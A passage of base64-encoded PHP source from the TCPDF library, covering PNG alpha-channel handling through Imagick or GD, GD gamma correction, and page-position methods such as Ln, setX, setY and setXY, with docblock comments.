pbGUgTmFtZSBvZiB0aGUgZmlsZSBjb250YWluaW5nIHRoZSBpbWFnZS4KCSAqIEBwYXJhbSBmbG9hdCAkeCBBYnNjaXNzYSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHkgT3JkaW5hdGUgb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyLgoJICogQHBhcmFtIGZsb2F0ICR3cHggT3JpZ2luYWwgd2lkdGggb2YgdGhlIGltYWdlIGluIHBpeGVscy4KCSAqIEBwYXJhbSBmbG9hdCAkaHB4IG9yaWdpbmFsIGhlaWdodCBvZiB0aGUgaW1hZ2UgaW4gcGl4ZWxzLgoJICogQHBhcmFtIGZsb2F0ICR3IFdpZHRoIG9mIHRoZSBpbWFnZSBpbiB0aGUgcGFnZS4gSWYgbm90IHNwZWNpZmllZCBvciBlcXVhbCB0byB6ZXJvLCBpdCBpcyBhdXRvbWF0aWNhbGx5IGNhbGN1bGF0ZWQuCgkgKiBAcGFyYW0gZmxvYXQgJGggSGVpZ2h0IG9mIHRoZSBpbWFnZSBpbiB0aGUgcGFnZS4gSWYgbm90IHNwZWNpZmllZCBvciBlcXVhbCB0byB6ZXJvLCBpdCBpcyBhdXRvbWF0aWNhbGx5IGNhbGN1bGF0ZWQuCgkgKiBAcGFyYW0gc3RyaW5nICR0eXBlIEltYWdlIGZvcm1hdC4gUG9zc2libGUgdmFsdWVzIGFyZSAoY2FzZSBpbnNlbnNpdGl2ZSk6IEpQRUcgYW5kIFBORyAod2hpdG91dCBHRCBsaWJyYXJ5KSBhbmQgYWxsIGltYWdlcyBzdXBwb3J0ZWQgYnkgR0Q6IEdELCBHRDIsIEdEMlBBUlQsIEdJRiwgSlBFRywgUE5HLCBCTVAsIFhCTSwgWFBNOy4gSWYgbm90IHNwZWNpZmllZCwgdGhlIHR5cGUgaXMgaW5mZXJyZWQgZnJvbSB0aGUgZmlsZSBleHRlbnNpb24uCgkgKiBAcGFyYW0gbWl4ZWQgJGxpbmsgVVJMIG9yIGlkZW50aWZpZXIgcmV0dXJuZWQgYnkgQWRkTGluaygpLgoJICogQHBhcmFtIHN0cmluZyAkYWxpZ24gSW5kaWNhdGVzIHRoZSBhbGlnbm1lbnQgb2YgdGhlIHBvaW50ZXIgbmV4dCB0byBpbWFnZSBpbnNlcnRpb24gcmVsYXRpdmUgdG8gaW1hZ2UgaGVpZ2h0LiBUaGUgdmFsdWUgY2FuIGJlOjx1bD48bGk+VDogdG9wLXJpZ2h0IGZvciBMVFIgb3IgdG9wLWxlZnQgZm9yIFJUTDwvbGk+PGxpPk06IG1pZGRsZS1yaWdodCBmb3IgTFRSIG9yIG1pZGRsZS1sZWZ0IGZvciBSVEw8L2xpPjxsaT5COiBib3R0b20tcmlnaHQgZm9yIExUUiBvciBib3R0b20tbGVmdCBmb3IgUlRMPC9saT48bGk+TjogbmV4dCBsaW5lPC9saT48L3VsPgoJICogQHBhcmFtIGJvb2xlYW4gJHJlc2l6ZSBJZiB0cnVlIHJlc2l6ZSAocmVkdWNlKSB0aGUgaW1hZ2UgdG8gZml0ICR3IGFuZCAkaCAocmVxdWlyZXMgR0QgbGlicmFyeSkuCgkgKiBAcGFyYW0gaW50ICRkcGkgZG90LXBlci1pbmNoIHJlc29sdXRpb24gdXNlZCBvbiByZXNpemUKCSAqIEBwYXJhbSBzdHJpbmcgJHBhbGlnbiBBbGxvd3MgdG8gY2VudGVyIG9yIGFsaWduIHRoZSBpbWFnZSBvbiB0aGUgY3VycmVudCBsaW5lLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+TCA6IGxlZnQgYWxpZ248L2xpPjxsaT5DIDogY2VudGVyPC9saT48bGk+UiA6IHJpZ2h0IGFsaWduPC9saT48bGk+JycgOiBlbXB0eSBzdHJpbmcgOiBsZWZ0IGZvciBMVFIgb3IgcmlnaHQgZm9yIFJUTDwvbGk+PC91bD4KCSAqIEBwYXJhbSBzdHJpbmcgJGZpbGVoYXNoIEZpbGUgaGFzaCB1c2VkIHRvIGJ1aWxkIHVuaXF1ZSBmaWxlIG5hbWVzLgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjMuMDA3ICgyMDA4LTEyLTA0KQoJICogQHNlZSBJbWFnZSgpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBJbWFnZVBuZ0FscGhhKCRmaWxlLCAkeCwgJHksICR3cHgsICRocHgsICR3LCAkaCwgJHR5cGUsICRsaW5rLCAkYWxpZ24sICRyZXNpemUsICRkcGksICRwYWxpZ24sICRmaWxlaGFzaD0nJykgewoJCS8vIGNyZWF0ZSB0ZW1wIGltYWdlcwoJCWlmIChlbXB0eSgkZmlsZWhhc2gpKSB7CgkJCSRmaWxlaGFzaCA9IG1kNSgkZmlsZSk7CgkJfQoJCS8vIGNyZWF0ZSB0ZW1wIGltYWdlIGZpbGUgKHdpdGhvdXQgYWxwaGEgY2hhbm5lbCkKCQkkdGVtcGZpbGVfcGxhaW4gPSBLX1BBVEhfQ0FDSEUuJ19fdGNwZGZfJy4kdGhpcy0+ZmlsZV9pZC4nX2ltZ21hc2tfcGxhaW5fJy4kZmlsZWhhc2g7CgkJLy8gY3JlYXRlIHRlbXAgYWxwaGEgZmlsZQoJCSR0ZW1wZmlsZV9hbHBoYSA9IEtfUEFUSF9DQUNIRS4nX190Y3BkZl8nLiR0aGlzLT5maWxlX2lkLidfaW1nbWFza19hbHBoYV8nLiRmaWxlaGFzaDsKCQkkcGFyc2VkID0gZmFsc2U7CgkJJHBhcnNlX2Vycm9yID0gJyc7CgkJLy8gSW1hZ2VNYWdpY2sgZXh0ZW5zaW9uCgkJaWYgKCgkcGFyc2VkID09PSBmYWxzZSkgQU5EIGV4dGVuc2lvbl9sb2FkZWQoJ2ltYWdpY2snKSkgewoJCQl0cnkgewoJCQkJLy8gSW1hZ2VNYWdpY2sgbGlicmFyeQoJCQkJJGltZyA9IG5ldyBJbWFnaWNrKCk7CgkJCQkkaW1nLT5yZWFkSW1hZ2UoJGZpbGUpOwoJCQkJLy8gY2xvbmUgaW1hZ2Ugb2JqZWN0CgkJCQkkaW1nYSA9IFRDUERGX1NUQVRJQzo6b2JqY2xvbmUoJGltZyk7CgkJCQkvLyBleHRyYWN0IGFscGhhIGNoYW5uZWwKCQkJCWlmIChtZXRob2RfZXhpc3RzKCRpbWcsICdzZXRJbWFnZUFscGhhQ2hhbm5lbCcpIEFORCBkZWZpbmVkKCdJbWFnaWNrOjpBTFBIQUNIQU5ORUxfRVhUUkFDVCcpKSB7CgkJCQkJJGltZy0+c2V0SW1hZ2VBbHBoYUNoYW5uZWwoSW1hZ2ljazo6QUxQSEFDSEFOTkVMX0VYVFJBQ1QpOwoJCQkJfSBlbHNlIHsKCQkJCQkkaW1nLT5zZXBhcmF0ZUltYWdlQ2hhbm5lbCg4KTsgLy8gOCA9IChpbWFnaWNrOjpDSEFOTkVMX0FMUEhBIHwgaW1hZ2ljazo6Q0hBTk5FTF9PUEFDSVRZIHwgaW1hZ2ljazo6Q0hBTk5FTF9NQVRURSk7CgkJCQkJJGltZy0+bmVnYXRlSW1hZ2UodHJ1ZSk7CgkJCQl9CgkJCQkkaW1nLT5zZXRJbWFnZUZvcm1hdCgncG5nJyk7CgkJCQkkaW1nLT53cml0ZUltYWdlKCR0ZW1wZmlsZV9hbHBoYSk7CgkJCQkvLyByZW1vdmUgYWxwaGEgY2hhbm5lbAoJCQkJaWYgKG1ldGhvZF9leGlzdHMoJGltZ2EsICdzZXRJbWFnZU1hdHRlJykpIHsKCQkJCQkkaW1nYS0+c2V0SW1hZ2VNYXR0ZShmYWxzZSk7CgkJCQl9IGVsc2UgewoJCQkJCSRpbWdhLT5zZXBhcmF0ZUltYWdlQ2hhbm5lbCgzOSk7IC8vIDM5ID0gKGltYWdpY2s6OkNIQU5ORUxfQUxMICYgfihpbWFnaWNrOjpDSEFOTkVMX0FMUEhBIHwgaW1hZ2ljazo6Q0hBTk5FTF9PUEFDSVRZIHwgaW1hZ2ljazo6Q0hBTk5FTF9NQVRURSkpOwoJCQkJfQoJCQkJJGltZ2EtPnNldEltYWdlRm9ybWF0KCdwbmcnKTsKCQkJCSRpbWdhLT53cml0ZUltYWdlKCR0ZW1wZmlsZV9wbGFpbik7CgkJCQkkcGFyc2VkID0gdHJ1ZTsKCQkJfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CgkJCQkvLyBJbWFnZW1hZ2ljayBmYWlscywgdHJ5IHdpdGggR0QKCQkJCSRwYXJzZV9lcnJvciA9ICdJbWFnaWNrIGxpYnJhcnkgZXJyb3I6ICcuJGUtPmdldE1lc3NhZ2UoKTsKCQkJfQoJCX0KCQkvLyBHRCBleHRlbnNpb24KCQlpZiAoKCRwYXJzZWQgPT09IGZhbHNlKSBBTkQgZnVuY3Rpb25fZXhpc3RzKCdpbWFnZWNyZWF0ZWZyb21wbmcnKSkgewoJCQl0cnkgewoJCQkJLy8gZ2VuZXJhdGUgaW1hZ2VzCgkJCQkkaW1nID0gaW1hZ2VjcmVhdGVmcm9tcG5nKCRmaWxlKTsKCQkJCSRpbWdhbHBoYSA9IGltYWdlY3JlYXRlKCR3cHgsICRocHgpOwoJCQkJLy8gZ2VuZXJhdGUgZ3JheSBzY2FsZSBwYWxldHRlICgwIC0+IDI1NSkKCQkJCWZvciAoJGMgPSAwOyAkYyA8IDI1NjsgKyskYykgewoJCQkJCUltYWdlQ29sb3JBbGxvY2F0ZSgkaW1nYWxwaGEsICRjLCAkYywgJGMpOwoJCQkJfQoJCQkJLy8gZXh0cmFjdCBhbHBoYSBjaGFubmVsCgkJCQlmb3IgKCR4cHggPSAwOyAkeHB4IDwgJHdweDsgKyskeHB4KSB7CgkJCQkJZm9yICgkeXB4ID0gMDsgJHlweCA8ICRocHg7ICsrJHlweCkgewoJCQkJCQkkY29sb3IgPSBpbWFnZWNvbG9yYXQoJGltZywgJHhweCwgJHlweCk7CgkJCQkJCS8vIGdldCBhbmQgY29ycmVjdCBnYW1tYSBjb2xvcgoJCQkJCQkkYWxwaGEgPSAkdGhpcy0+Z2V0R0RnYW1tYSgkaW1nLCAkY29sb3IpOwoJCQkJCQlpbWFnZXNldHBpeGVsKCRpbWdhbHBoYSwgKGludCkgJHhweCwgKGludCkgJHlweCwgKGludCkgJGFscGhhKTsKCQkJCQl9CgkJCQl9CgkJCQlpbWFnZXBuZygkaW1nYWxwaGEsICR0ZW1wZmlsZV9hbHBoYSk7CgkJCQlpbWFnZWRlc3Ryb3koJGltZ2FscGhhKTsKCQkJCS8vIGV4dHJhY3QgaW1hZ2Ugd2l0aG91dCBhbHBoYSBjaGFubmVsCgkJCQkkaW1ncGxhaW4gPSBpbWFnZWNyZWF0ZXRydWVjb2xvcigkd3B4LCAkaHB4KTsKCQkJCWltYWdlY29weSgkaW1ncGxhaW4sICRpbWcsIDAsIDAsIDAsIDAsICR3cHgsICRocHgpOwoJCQkJaW1hZ2VwbmcoJGltZ3BsYWluLCAkdGVtcGZpbGVfcGxhaW4pOwoJCQkJaW1hZ2VkZXN0cm95KCRpbWdwbGFpbik7CgkJCQkkcGFyc2VkID0gdHJ1ZTsKCQkJfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CgkJCQkvLyBHRCBmYWlscwoJCQkJJHBhcnNlX2Vycm9yID0gJ0dEIGxpYnJhcnkgZXJyb3I6ICcuJGUtPmdldE1lc3NhZ2UoKTsKCQkJfQoJCX0KCQlpZiAoJHBhcnNlZCA9PT0gZmFsc2UpIHsKCQkJaWYgKGVtcHR5KCRwYXJzZV9lcnJvcikpIHsKCQkJCSR0aGlzLT5FcnJvcignVENQREYgcmVxdWlyZXMgdGhlIEltYWdpY2sgb3IgR0QgZXh0ZW5zaW9uIHRvIGhhbmRsZSBQTkcgaW1hZ2VzIHdpdGggYWxwaGEgY2hhbm5lbC4nKTsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT5FcnJvcigkcGFyc2VfZXJyb3IpOwoJCQl9CgkJfQoJCS8vIGVtYmVkIG1hc2sgaW1hZ2UKCQkkaW1nbWFzayA9ICR0aGlzLT5JbWFnZSgkdGVtcGZpbGVfYWxwaGEsICR4LCAkeSwgJHcsICRoLCAnUE5HJywgJycsICcnLCAkcmVzaXplLCAkZHBpLCAnJywgdHJ1ZSwgZmFsc2UpOwoJCS8vIGVtYmVkIGltYWdlLCBtYXNrZWQgd2l0aCBwcmV2aW91c2x5IGVtYmVkZGVkIG1hc2sKCQkkdGhpcy0+SW1hZ2UoJHRlbXBmaWxlX3BsYWluLCAkeCwgJHksICR3LCAkaCwgJHR5cGUsICRsaW5rLCAkYWxpZ24sICRyZXNpemUsICRkcGksICRwYWxpZ24sIGZhbHNlLCAkaW1nbWFzayk7Cgl9CgoJLyoqCgkgKiBHZXQgdGhlIEdELWNvcnJlY3RlZCBQTkcgZ2FtbWEgdmFsdWUgZnJvbSBhbHBoYSBjb2xvcgoJICogQHBhcmFtIHJlc291cmNlICRpbWcgR0QgaW1hZ2UgUmVzb3VyY2UgSUQuCgkgKiBAcGFyYW0gaW50ICRjIGFscGhhIGNvbG9yCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC4zLjAwNyAoMjAwOC0xMi0wNCkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGdldEdEZ2FtbWEoJGltZywgJGMpIHsKCQlpZiAoIWlzc2V0KCR0aGlzLT5nZGdhbW1hY2FjaGVbJyMnLiRjXSkpIHsKCQkJJGNvbG9ycyA9IGltYWdlY29sb3JzZm9yaW5kZXgoJGltZywgJGMpOwoJCQkvLyBHRCBhbHBoYSBpcyBvbmx5IDcgYml0ICgwIC0+IDEyNykKCQkJJHRoaXMtPmdkZ2FtbWFjYWNoZVsnIycuJGNdID0gKGludCkgKCgoMTI3IC0gJGNvbG9yc1snYWxwaGEnXSkgLyAxMjcpICogMjU1KTsKCQkJLy8gY29ycmVjdCBnYW1tYQoJCQkkdGhpcy0+Z2RnYW1tYWNhY2hlWycjJy4kY10gPSAoaW50KSAocG93KCgkdGhpcy0+Z2RnYW1tYWNhY2hlWycjJy4kY10gLyAyNTUpLCAyLjIpICogMjU1KTsKCQkJLy8gc3RvcmUgdGhlIGxhdGVzdCB2YWx1ZXMgb24gY2FjaGUgdG8gaW1wcm92ZSBwZXJmb3JtYW5jZXMKCQkJaWYgKGNvdW50KCR0aGlzLT5nZGdhbW1hY2FjaGUpID4gOCkgewoJCQkJLy8gcmVtb3ZlIG9uZSBlbGVtZW50IGZyb20gdGhlIGNhY2hlIGFycmF5CgkJCQlhcnJheV9zaGlmdCgkdGhpcy0+Z2RnYW1tYWNhY2hlKTsKCQkJfQoJCX0KCQlyZXR1cm4gJHRoaXMtPmdkZ2FtbWFjYWNoZVsnIycuJGNdOwoJfQoKCS8qKgoJICogUGVyZm9ybXMgYSBsaW5lIGJyZWFrLgoJICogVGhlIGN1cnJlbnQgYWJzY2lzc2EgZ29lcyBiYWNrIHRvIHRoZSBsZWZ0IG1hcmdpbiBhbmQgdGhlIG9yZGluYXRlIGluY3JlYXNlcyBieSB0aGUgYW1vdW50IHBhc3NlZCBpbiBwYXJhbWV0ZXIuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkaCBUaGUgaGVpZ2h0IG9mIHRoZSBicmVhay4gQnkgZGVmYXVsdCwgdGhlIHZhbHVlIGVxdWFscyB0aGUgaGVpZ2h0IG9mIHRoZSBsYXN0IHByaW50ZWQgY2VsbC4KCSAqIEBwYXJhbSBib29sZWFuICRjZWxsIGlmIHRydWUgYWRkIHRoZSBjdXJyZW50IGxlZnQgKG9yIHJpZ2h0IG8gZm9yIFJUTCkgcGFkZGluZyB0byB0aGUgWCBjb29yZGluYXRlCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4wCgkgKiBAc2VlIENlbGwoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gTG4oJGg9bnVsbCwgJGNlbGw9ZmFsc2UpIHsKCQlpZiAoKCR0aGlzLT5udW1fY29sdW1ucyA+IDEpIEFORCAoJHRoaXMtPnkgPT0gJHRoaXMtPmNvbHVtbnNbJHRoaXMtPmN1cnJlbnRfY29sdW1uXVsneSddKSBBTkQgaXNzZXQoJHRoaXMtPmNvbHVtbnNbJHRoaXMtPmN1cnJlbnRfY29sdW1uXVsneCddKSBBTkQgKCR0aGlzLT54ID09ICR0aGlzLT5jb2x1bW5zWyR0aGlzLT5jdXJyZW50X2NvbHVtbl1bJ3gnXSkpIHsKCQkJLy8gcmV2b3ZlIHZlcnRpY2FsIHNwYWNlIGZyb20gdGhlIHRvcCBvZiB0aGUgY29sdW1uCgkJCXJldHVybjsKCQl9CgkJaWYgKCRjZWxsKSB7CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkY2VsbHBhZGRpbmcgPSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ107CgkJCX0gZWxzZSB7CgkJCQkkY2VsbHBhZGRpbmcgPSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ107CgkJCX0KCQl9IGVsc2UgewoJCQkkY2VsbHBhZGRpbmcgPSAwOwoJCX0KCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkdGhpcy0+eCA9ICR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4gLSAkY2VsbHBhZGRpbmc7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnggPSAkdGhpcy0+bE1hcmdpbiArICRjZWxscGFkZGluZzsKCQl9CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRoKSkgewoJCQkkaCA9ICR0aGlzLT5sYXN0aDsKCQl9CgkJJHRoaXMtPnkgKz0gJGg7CgkJJHRoaXMtPm5ld2xpbmUgPSB0cnVlOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgcmVsYXRpdmUgWCB2YWx1ZSBvZiBjdXJyZW50IHBvc2l0aW9uLgoJICogVGhlIHZhbHVlIGlzIHJlbGF0aXZlIHRvIHRoZSBsZWZ0IGJvcmRlciBmb3IgTFRSIGxhbmd1YWdlcyBhbmQgdG8gdGhlIHJpZ2h0IGJvcmRlciBmb3IgUlRMIGxhbmd1YWdlcy4KCSAqIEByZXR1cm4gZmxvYXQKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjIKCSAqIEBzZWUgU2V0WCgpLCBHZXRZKCksIFNldFkoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gR2V0WCgpIHsKCQkvL0dldCB4IHBvc2l0aW9uCgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJcmV0dXJuICgkdGhpcy0+dyAtICR0aGlzLT54KTsKCQl9IGVsc2UgewoJCQlyZXR1cm4gJHRoaXMtPng7CgkJfQoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgYWJzb2x1dGUgWCB2YWx1ZSBvZiBjdXJyZW50IHBvc2l0aW9uLgoJICogQHJldHVybiBmbG9hdAoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMgoJICogQHNlZSBTZXRYKCksIEdldFkoKSwgU2V0WSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBHZXRBYnNYKCkgewoJCXJldHVybiAkdGhpcy0+eDsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIG9yZGluYXRlIG9mIHRoZSBjdXJyZW50IHBvc2l0aW9uLgoJICogQHJldHVybiBmbG9hdAoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMAoJICogQHNlZSBTZXRZKCksIEdldFgoKSwgU2V0WCgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBHZXRZKCkgewoJCXJldHVybiAkdGhpcy0+eTsKCX0KCgkvKioKCSAqIERlZmluZXMgdGhlIGFic2Npc3NhIG9mIHRoZSBjdXJyZW50IHBvc2l0aW9uLgoJICogSWYgdGhlIHBhc3NlZCB2YWx1ZSBpcyBuZWdhdGl2ZSwgaXQgaXMgcmVsYXRpdmUgdG8gdGhlIHJpZ2h0IG9mIHRoZSBwYWdlIChvciBsZWZ0IGlmIGxhbmd1YWdlIGlzIFJUTCkuCgkgKiBAcGFyYW0gZmxvYXQgJHggVGhlIHZhbHVlIG9mIHRoZSBhYnNjaXNzYSBpbiB1c2VyIHVuaXRzLgoJICogQHBhcmFtIGJvb2xlYW4gJHJ0bG9mZiBpZiB0cnVlIGFsd2F5cyB1c2VzIHRoZSBwYWdlIHRvcC1sZWZ0IGNvcm5lciBhcyBvcmlnaW4gb2YgYXhpcy4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjIKCSAqIEBzZWUgR2V0WCgpLCBHZXRZKCksIFNldFkoKSwgU2V0WFkoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0WCgkeCwgJHJ0bG9mZj1mYWxzZSkgewoJCSR4ID0gZmxvYXR2YWwoJHgpOwoJCWlmICghJHJ0bG9mZiBBTkQgJHRoaXMtPnJ0bCkgewoJCQlpZiAoJHggPj0gMCkgewoJCQkJJHRoaXMtPnggPSAkdGhpcy0+dyAtICR4OwoJCQl9IGVsc2UgewoJCQkJJHRoaXMtPnggPSBhYnMoJHgpOwoJCQl9CgkJfSBlbHNlIHsKCQkJaWYgKCR4ID49IDApIHsKCQkJCSR0aGlzLT54ID0gJHg7CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT53ICsgJHg7CgkJCX0KCQl9CgkJaWYgKCR0aGlzLT54IDwgMCkgewoJCQkkdGhpcy0+eCA9IDA7CgkJfQoJCWlmICgkdGhpcy0+eCA+ICR0aGlzLT53KSB7CgkJCSR0aGlzLT54ID0gJHRoaXMtPnc7CgkJfQoJfQoKCS8qKgoJICogTW92ZXMgdGhlIGN1cnJlbnQgYWJzY2lzc2EgYmFjayB0byB0aGUgbGVmdCBtYXJnaW4gYW5kIHNldHMgdGhlIG9yZGluYXRlLgoJICogSWYgdGhlIHBhc3NlZCB2YWx1ZSBpcyBuZWdhdGl2ZSwgaXQgaXMgcmVsYXRpdmUgdG8gdGhlIGJvdHRvbSBvZiB0aGUgcGFnZS4KCSAqIEBwYXJhbSBmbG9hdCAkeSBUaGUgdmFsdWUgb2YgdGhlIG9yZGluYXRlIGluIHVzZXIgdW5pdHMuCgkgKiBAcGFyYW0gYm9vbCAkcmVzZXR4IGlmIHRydWUgKGRlZmF1bHQpIHJlc2V0IHRoZSBYIHBvc2l0aW9uLgoJICogQHBhcmFtIGJvb2xlYW4gJHJ0bG9mZiBpZiB0cnVlIGFsd2F5cyB1c2VzIHRoZSBwYWdlIHRvcC1sZWZ0IGNvcm5lciBhcyBvcmlnaW4gb2YgYXhpcy4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjAKCSAqIEBzZWUgR2V0WCgpLCBHZXRZKCksIFNldFkoKSwgU2V0WFkoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0WSgkeSwgJHJlc2V0eD10cnVlLCAkcnRsb2ZmPWZhbHNlKSB7CgkJJHkgPSBmbG9hdHZhbCgkeSk7CgkJaWYgKCRyZXNldHgpIHsKCQkJLy9yZXNldCB4CgkJCWlmICghJHJ0bG9mZiBBTkQgJHRoaXMtPnJ0bCkgewoJCQkJJHRoaXMtPnggPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luOwoJCQl9IGVsc2UgewoJCQkJJHRoaXMtPnggPSAkdGhpcy0+bE1hcmdpbjsKCQkJfQoJCX0KCQlpZiAoJHkgPj0gMCkgewoJCQkkdGhpcy0+eSA9ICR5OwoJCX0gZWxzZSB7CgkJCSR0aGlzLT55ID0gJHRoaXMtPmggKyAkeTsKCQl9CgkJaWYgKCR0aGlzLT55IDwgMCkgewoJCQkkdGhpcy0+eSA9IDA7CgkJfQoJCWlmICgkdGhpcy0+eSA+ICR0aGlzLT5oKSB7CgkJCSR0aGlzLT55ID0gJHRoaXMtPmg7CgkJfQoJfQoKCS8qKgoJICogRGVmaW5lcyB0aGUgYWJzY2lzc2EgYW5kIG9yZGluYXRlIG9mIHRoZSBjdXJyZW50IHBvc2l0aW9uLgoJICogSWYgdGhlIHBhc3NlZCB2YWx1ZXMgYXJlIG5lZ2F0aXZlLCB0aGV5IGFyZSByZWxhdGl2ZSByZXNwZWN0aXZlbHkgdG8gdGhlIHJpZ2h0IGFuZCBib3R0b20gb2YgdGhlIHBhZ2UuCgkgKiBAcGFyYW0gZmxvYXQgJHggVGhlIHZhbHVlIG9mIHRoZSBhYnNjaXNzYS4KCSAqIEBwYXJhbSBmbG9hdCAkeSBUaGUgdmFsdWUgb2YgdGhlIG9yZGluYXRlLgoJICogQHBhcmFtIGJvb2xlYW4gJHJ0bG9mZiBpZiB0cnVlIGFsd2F5cyB1c2VzIHRoZSBwYWdlIHRvcC1sZWZ0IGNvcm5lciBhcyBvcmlnaW4gb2YgYXhpcy4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjIKCSAqIEBzZWUgU2V0WCgpLCBTZXRZKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFhZKCR4LCAkeSwgJHJ0bG9mZj1mYWxzZSkgewoJCSR0aGlzLT5zZXRZKCR5LCBmYWxzZSwgJHJ0bG9mZik7CgkJJHRoaXMtPnNldFgoJHgsICRydGxvZmYpOwoJfQoKCS8qKgoJICogU2V0IHRoZSBhYnNvbHV0ZSBYIGNvb3JkaW5hdGUgb2YgdGhlIGN1cnJlbnQgcG9pbnRlci4KCSAqIEBwYXJhbSBmbG9hdCAkeCBUaGUgdmFsdWUgb2YgdGhlIGFic2Npc3NhIGluIHVzZXIgdW5pdHMuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjE4NiAoMjAxMi0wOS0xMykKCSAqIEBzZWUgc2V0QWJzWCgpLCBzZXRBYnNZKCksIFNldEFic1hZKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEFic1goJHgpIHsKCQkkdGhpcy0+eCA9IGZsb2F0dmFsKCR4KTsKCX0KCgkvKioKCSAqIFNldCB0aGUgYWJzb2x1dGUgWSBjb29yZGluYXRlIG9mIHRoZSBjdXJyZW50IHBvaW50ZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHkgKGZsb2F0KSBUaGUgdmFsdWUgb2YgdGhlIG9yZGluYXRlIGluIHVzZXIgdW5pdHMuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjE4NiAoMjAxMi0wOS0xMykKCSAqIEBzZWUgc2V0QWJzWCgpLCBzZXRBYnNZKCksIFNldEFic1hZKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEFic1koJHkpIHsKCQkkdGhpcy0+eSA9IGZsb2F0dmFsKCR5KTsKCX0KCgkvKioKCSAqIFNldCB0aGUgYWJzb2x1dGUgWCBhbmQgWSBjb29yZGluYXRlcyBvZiB0aGUgY3VycmVudCBwb2ludGVyLgoJICogQHBhcmFtIGZsb2F0ICR4IFRoZSB2YWx1ZSBvZiB0aGUgYWJzY2lzc2EgaW4gdXNlciB1bml0cy4KCSAqIEBwYXJhbSBmbG9hdCAkeSAoZmxvYXQpIFRoZSB2YWx1ZSBvZiB0aGUgb3JkaW5hdGUgaW4gdXNlciB1bml0cy4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMTg2ICgyMDEyLTA5LTEzKQoJICogQHNlZSBzZXRBYnNYKCksIHNldEFic1koKSwgU2V0QWJzWFkoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0QWJzWFkoJHgsICR5KSB7CgkJJHRoaXMtPnNldEFic1goJHgpOwoJCSR0aGlzLT5zZXRBYnNZKCR5KTsKCX0KCgkvKioKCSAqIFNlbmQgdGhlIGRvY3VtZW50IHRvIGEgZ2l2ZW4gZGVzdGluYXRpb246IHN0cmluZywgbG9jYWwgZmlsZSBvciBicm93c2VyLgoJICogSW4gdGhlIGxhc3QgY2FzZSwgdGhlIHBsdWctaW4gbWF5IGJlIHVzZWQgKGlmIHByZXNlbnQpIG9yIGEgZG93bmxvYWQgKCJTYXZlIGFzIiBkaWFsb2cgYm94KSBtYXkgYmUgZm9yY2VkLjxiciAvPgoJICogVGhlIG1ldGhvZCBmaXJzdCBjYWxscyBDbG9zZSgpIGlmIG5lY2Vzc2FyeSB0byB0ZXJtaW5hdGUgdGhlIGRvY3VtZW50LgoJICogQHBhcmFtIHN0cmluZyAkbmFtZSBUaGUgbmFtZSBvZiB0aGUgZmlsZSB3aGVuIHNhdmVkCgkgKiBAcGFyYW0gc3RyaW5nICRkZXN0IERlc3RpbmF0aW9uIHdoZXJlIHRvIHNlbmQgdGhlIGRvY3VtZW50LiBJdCBjYW4gdGFrZSBvbmUgb2YgdGhlIGZvbGxvd2luZyB2YWx1ZXM6PHVsPjxsaT5JOiBzZW5kIHRoZSBmaWxlIGlubGluZSB0byB0aGUgYnJvd3NlciAoZGVmYXVsdCkuIFRoZSBwbHVnLWluIGlzIHVzZWQgaWYgYXZhaWxhYmxlLiBUaGUgbmFtZSBnaXZlbiBieSBuYW1lIGlzIHVzZWQgd2hlbiBvbmUgc2VsZWN0cyB0aGUgIlNhdmUgYXMiIG9wdGlvbiBvbiB0aGUgbGluayBnZW5lcmF0aW5nIHRoZSBQREYuPC9saT48bGk+RDogc2VuZCB0byB0aGUgYnJvd3NlciBhbmQgZm9yY2UgYSBmaWxlIGRvd25sb2FkIHdpdGggdGhlIG5hbWUgZ2l2ZW4gYnkgbmFtZS48L2xpPjxsaT5GOiBzYXZlIHRvIGEgbG9jYWwgc2VydmVyIGZpb